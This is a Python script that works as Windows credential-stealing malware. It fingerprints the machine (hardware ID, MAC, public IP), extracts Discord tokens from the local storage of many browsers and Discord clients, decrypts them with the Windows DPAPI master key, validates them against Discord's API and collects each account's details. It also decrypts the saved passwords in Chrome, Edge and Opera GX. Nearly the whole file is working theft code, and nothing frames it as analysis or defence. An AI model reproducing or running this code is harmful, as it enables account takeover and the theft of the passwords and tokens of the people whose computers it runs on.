import requests, wmi, subprocess, psutil, platform, json
import base64
import json
import os
import re
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData


def get_mac_address():
	for interface, addrs in psutil.net_if_addrs().items():
		if interface == "Wi-Fi":
			for addr in addrs:
				if addr.family == psutil.AF_LINK:
					mac = addr.address
					return mac


def machineinfo():
	mem = psutil.virtual_memory()

	c = wmi.WMI()
	for gpu in c.Win32_DisplayConfiguration():
		GPUm = gpu.Description.strip()

	current_machine_id = str(subprocess.check_output('wmic csproduct get uuid'), 'utf-8').split('\n')[1].strip()

	reqip = requests.get("https://api.ipify.org/?format=json").json()

	mac = get_mac_address()

	result = ""

	result += f'PC: {platform.node()} \n'
	result += f'OS: {platform.platform()} \n'
	result += f'RAM: {mem.total / 1024 ** 3} GB \n'
	result += f'GPU: {GPUm} \n'
	result += f'CPU: {platform.processor()} \n'
	result += f'HWID: {current_machine_id} \n'
	result += f'MAC: {mac} \n'
	result += f'IP: {reqip['ip']} \n'

	return result

class DiscordToken:
	def __init__(self):
		self.result = upload_tokens().upload()

	def get_result(self):
		return self.result

class extract_tokens:
	def __init__(self) -> None:
		self.base_url = "https://discord.com/api/v9/users/@me"
		self.appdata = os.getenv("localappdata")
		self.roaming = os.getenv("appdata")
		self.regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
		self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"

		self.tokens, self.uids = [], []

		self.extract()

	def extract(self) -> None:
		paths = {
			'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
			'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
			'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
			'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
			'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
			'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
			'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
			'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
			'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
			'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
			'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
			'7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
			'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
			'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
			'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
			'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
			'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
			'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
			'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
			'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
			'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
			'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
			'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
			'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
			'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
			'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
			'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
		}

		for name, path in paths.items():
			if not os.path.exists(path):
				continue
			_discord = name.replace(" ", "").lower()
			if "cord" in path:
				if not os.path.exists(self.roaming+f'\\{_discord}\\Local State'):
					continue
				for file_name in os.listdir(path):
					if file_name[-3:] not in ["log", "ldb"]:
						continue
					for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
						for y in re.findall(self.regexp_enc, line):
							token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+f'\\{_discord}\\Local State'))

							if self.validate_token(token):
								uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
								if uid not in self.uids:
									self.tokens.append(token)
									self.uids.append(uid)

			else:
				for file_name in os.listdir(path):
					if file_name[-3:] not in ["log", "ldb"]:
						continue
					for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
						for token in re.findall(self.regexp, line):
							if self.validate_token(token):
								uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
								if uid not in self.uids:
									self.tokens.append(token)
									self.uids.append(uid)

		if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
			for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
				for _file in files:
					if not _file.endswith('.sqlite'):
						continue
					for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
						for token in re.findall(self.regexp, line):
							if self.validate_token(token):
								uid = requests.get(self.base_url, headers={'Authorization': token}).json()['id']
								if uid not in self.uids:
									self.tokens.append(token)
									self.uids.append(uid)

	def validate_token(self, token: str) -> bool:
		r = requests.get(self.base_url, headers={'Authorization': token})

		if r.status_code == 200:
			#print(token)
			return True

		return False

	def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
		iv = buff[3:15]
		payload = buff[15:]
		cipher = AES.new(master_key, AES.MODE_GCM, iv)
		decrypted_pass = cipher.decrypt(payload)
		decrypted_pass = decrypted_pass[:-16].decode()

		return decrypted_pass

	def get_master_key(self, path: str) -> str:
		if not os.path.exists(path):
			return

		if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
			return

		with open(path, "r", encoding="utf-8") as f:
			c = f.read()
		local_state = json.loads(c)

		master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
		master_key = master_key[5:]
		master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]

		return master_key

class upload_tokens:
	def __init__(self):
		self.tokens = extract_tokens().tokens

	def upload(self):
		for token in self.tokens:
			headers = {'Authorization': token}
			user_data = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers).json()

			friends = requests.get('https://discordapp.com/api/v6/users/@me/relationships', headers=headers).json()
			friend_count = len(friends)

			result = ""
			result += f"Username: {user_data["username"]}#{user_data["discriminator"]} \n"
			result += f"ID: {user_data["id"]} \n"
			result += f"Avatar: https://cdn.discordapp.com/avatars/{user_data["id"]}/{user_data["avatar"]}.png?size=4096 \n"
			result += f"Token: {token} \n"
			result += f"Friends Count: {friend_count} \n"


			return result


import os
import json
import base64
import sqlite3
import win32crypt
import shutil
from Crypto.Cipher import AES
from datetime import datetime, timedelta


def get_chrome_datetime(chromedate):
	return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)


def get_encryption_key(browser):
	if browser == "chrome":
		local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data",
										"Local State")
	elif browser == "edge":
		local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data",
										"Local State")
	elif browser == "operagx":
		local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software",
										"Opera GX Stable", "Local State")
	else:
		raise ValueError("Unsupported browser")

	with open(local_state_path, "r", encoding="utf-8") as f:
		local_state = f.read()
		local_state = json.loads(local_state)
		key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
		key = key[5:]
		return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_password(password, key):
	try:
		iv = password[3:15]
		password = password[15:]
		cipher = AES.new(key, AES.MODE_GCM, iv)
		return cipher.decrypt(password)[:-16].decode()
	except:
		try:
			return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
		except:
			return ""


def fetch_browser_passwords():
	result = ""
	browsers = ["chrome", "edge", "operagx"]

	for browser in browsers:
		result += f"\npasswords from {browser.capitalize()}:\n"

		key = get_encryption_key(browser)

		if browser == "chrome":
			db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data",
								   "default", "Login Data")
		elif browser == "edge":
			db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data",
								   "Default", "Login Data")
		elif browser == "operagx":
			db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera GX Stable",
								   "Login Data")
		else:
			raise ValueError("Unsupported browser")

		if not os.path.isfile(db_path):
			print(f"Файл базы данных для {browser} не найден.")
			return

		filename = f"{browser}_data.db"
		shutil.copyfile(db_path, filename)
		db = sqlite3.connect(filename)
		cursor = db.cursor()
		cursor.execute(
			"SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_created")

		for row in cursor.fetchall():
			origin_url = row[0]
			action_url = row[1]
			username = row[2]
			password = decrypt_password(row[3], key)
			date_created = row[4]
			date_last_used = row[5]

			if username or password:
				result += f"Origin URL: {origin_url}\n"
				result += f"Action URL: {action_url}\n"
				result += f"Username: {username}\n"
				result += f"Password: {password}\n"

			if date_created != 86400000000 and date_created:
				result += f"Creation date: {str(get_chrome_datetime(date_created))}\n"
			if date_last_used != 86400000000 and date_last_used:
				result += f"Last Used: {str(get_chrome_datetime(date_last_used))}\n"

			result += "=" * 50 + "\n"

		cursor.close()
		db.close()

		try:
			os.remove(filename)
		except:
			pass

	return result

print("=" * 10 + "Pc info" + "=" * 10)
print(machineinfo())
print("=" * 10 + "Discord info" + "=" * 10)
print(DiscordToken().get_result())
print("=" * 10 + "Browser passwords" + "=" * 10)
print(fetch_browser_passwords())